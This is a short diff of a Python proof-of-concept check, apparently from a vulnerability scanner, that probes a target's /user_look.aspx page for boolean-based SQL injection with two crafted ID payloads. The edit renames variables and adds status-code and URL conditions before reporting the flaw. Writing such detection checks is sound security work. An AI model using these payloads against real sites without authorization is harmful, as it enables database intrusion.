@@ -34,12 +34,12 @@ class Poc(ABPoc):
             
             payload1 = "/user_look.aspx?ID=axyypy' and 233=234"
             payload2 = "/user_look.aspx?ID=axyypy' and 233=233"
-            vul_url1 = arg + payload1
-            vul_url2 = arg + payload2
-            response1 = requests.get(vul_url1)
-            response2 = requests.get(vul_url2)
+            url = arg + payload1
+            url1 = arg + payload2
+            _response = requests.get(url)
+            _response1 = requests.get(url1)
 
-            if response1.text != response2.text:
+            if _response.text != _response1.text and (url == _response.url or url1 == _response1.url) and (_response.status_code == 200 or _response1.status_code == 200):
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target, name=self.vuln.name))
 
         except Exception, e:
